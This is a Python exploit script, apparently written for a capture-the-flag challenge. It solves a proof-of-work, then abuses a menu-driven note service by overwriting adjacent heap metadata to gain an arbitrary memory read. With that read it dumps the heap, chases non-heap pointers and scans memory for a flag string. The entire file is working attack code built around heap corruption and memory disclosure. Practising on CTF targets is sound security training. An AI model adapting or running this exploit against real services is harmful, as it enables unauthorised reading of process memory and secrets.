#!/usr/bin/env python3
"""Step4: setup arb-read, enumerate non-heap pointers, deref them (safe), dump raw startup region."""
import hashlib, itertools, re, socket, string, sys, time, struct

HOST = sys.argv[1] if len(sys.argv) > 1 else "env.xj.edisec.net"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 32763
p64 = lambda x: struct.pack("<Q", x & 0xffffffffffffffff)
u64 = lambda b: struct.unpack("<Q", bytes(b[:8]).ljust(8, b"\x00"))[0]
FLAG_RE = re.compile(rb"(?:[Ff][Ll][Aa][Gg]|[A-Za-z0-9_]{2,12})\{[!-~]{3,80}\}")


def drain(s, wait=0.8, bufsize=1 << 20):
    s.settimeout(0.2)
    buf = b""
    end = time.monotonic() + wait
    while time.monotonic() < end:
        try:
            d = s.recv(bufsize)
        except socket.timeout:
            continue
        if not d:
            break
        buf += d
    return buf


def solve_pow(md5hex, masked):
    pos = [i for i, ch in enumerate(masked) if ch == "_"]
    fixed = list(masked)
    for combo in itertools.product(string.ascii_uppercase, repeat=len(pos)):
        for i, ch in zip(pos, combo):
            fixed[i] = ch
        if hashlib.md5("".join(fixed).encode()).hexdigest() == md5hex:
            return "".join(combo)
    raise SystemExit("pow failed")


class C:
    def __init__(self, host, port):
        self.s = socket.create_connection((host, port), timeout=10)
        b = drain(self.s, 1.5)
        m1 = re.search(rb"Token:\s*([A-Za-z_]+)", b); m2 = re.search(rb"MD5:\s*([0-9a-f]{32})", b)
        if not (m1 and m2):
            raise SystemExit("no pow banner: %r" % b[:120])
        ans = solve_pow(m2.group(1).decode(), m1.group(1).decode())
        print("[pow] %s -> %s" % (m1.group(1).decode(), ans), flush=True)
        self.send(ans, 1.4)

    def send(self, line, wait=0.7):
        try:
            self.s.sendall(str(line).encode() + b"\n")
        except OSError:
            return b""
        return drain(self.s, wait)

    def create(self, idx, title, reserve, length, hexdata):
        self.send(1); self.send(idx); self.send(title); self.send(reserve); self.send(length)
        return self.send(hexdata, 0.9)

    def edit(self, idx, length, hexdata, wait=0.9):
        self.send(2); self.send(idx); self.send(length); return self.send(hexdata, wait)

    def show(self, idx, wait=1.0):
        self.send(3); return self.send(idx, wait)

    def pack(self, idx):
        self.send(4); return self.send(idx)


def parse(r):
    m = re.search(rb"len=(\d+) cap=(\d+)\n([0-9a-f]*)\n", r)
    return (int(m.group(1)), int(m.group(2)), bytes.fromhex(m.group(3).decode())) if m else None


c = C(HOST, PORT)
c.create(0, "A", 512, 512, "41" * 512); c.pack(0)
c.create(1, "B", 32, 32, "42" * 32)
c.create(2, "C", 32, 32, "43" * 32)
c.create(3, "D", 32, 32, "44" * 32)
d = None
for _ in range(4):
    d = parse(c.show(0, wait=1.4))
    if d:
        break
A_USER = u64(d[2][0x30:0x38]) - 0x60
top = u64(d[2][0x168:0x170])
heap_end = A_USER + 0x160 + (top & ~0xf)
heap_start = heap_end - 0x21000
print("[heap] A_user=0x%x heap=[0x%x,0x%x]" % (A_USER, heap_start, heap_end), flush=True)


def arb_read(addr, n):
    p = bytearray(b"\x00" * 0x38)
    p[0x18:0x20] = p64(0x41); p[0x20:0x28] = p64(n)
    p[0x28:0x30] = p64(n); p[0x30:0x38] = p64(addr)
    c.edit(0, 0x38, p.hex())
    r = c.show(1, wait=1.2 + n / 8000.0)
    dd = parse(r)
    if not dd or len(dd[2]) < n:
        return None
    return dd[2][:n]


blob = b""; blobs = []
addr = heap_start
while addr < heap_end:
    n = min(0x4000, heap_end - addr)
    ch = arb_read(addr, n)
    if ch is None:
        print("[scan] stop @0x%x" % addr, flush=True); break
    blobs.append((addr, ch)); blob += ch; addr += n
print("[heap] read %d bytes" % len(blob), flush=True)

f = FLAG_RE.search(blob)
print("[heap flag]", f.group(0) if f else None, flush=True)

cand = {}
for base, b in blobs:
    for i in range(0, len(b) - 8 + 1, 8):
        q = u64(b[i:i + 8])
        if 0x10000 < q < 0x800000000000 and not (heap_start <= q < heap_end):
            cand[q] = cand.get(q, 0) + 1
print("[ptrs] %d non-heap candidates:" % len(cand), flush=True)
for q in sorted(cand):
    print("   0x%x x%d" % (q, cand[q]), flush=True)

print("\n[deref]", flush=True)
for q in sorted(cand)[:20]:
    mm = arb_read(q, 0x80)
    if mm is None:
        print("  0x%x -> read FAIL" % q, flush=True); continue
    pg = arb_read(q & ~0xfff, 4)
    print("  0x%x page=0x%x pg4=%s" % (q, q & ~0xfff, pg.hex() if pg else None), flush=True)
    print("      %s" % mm.hex(), flush=True)
    print("      runs=%r" % re.findall(rb"[ -~]{4,}", mm)[:6], flush=True)
    ff = FLAG_RE.search(mm)
    if ff:
        print("      !!! FLAG: %s" % ff.group(0).decode(), flush=True)

print("\n[startup raw 0x0a0..0x360]", flush=True)
for off in range(0x0a0, 0x360, 16):
    print("   +0x%03x  %s  %r" % (off, blob[off:off + 16].hex(),
                                  re.sub(rb"[^\x20-\x7e]", b".", blob[off:off + 16])), flush=True)
c.s.close()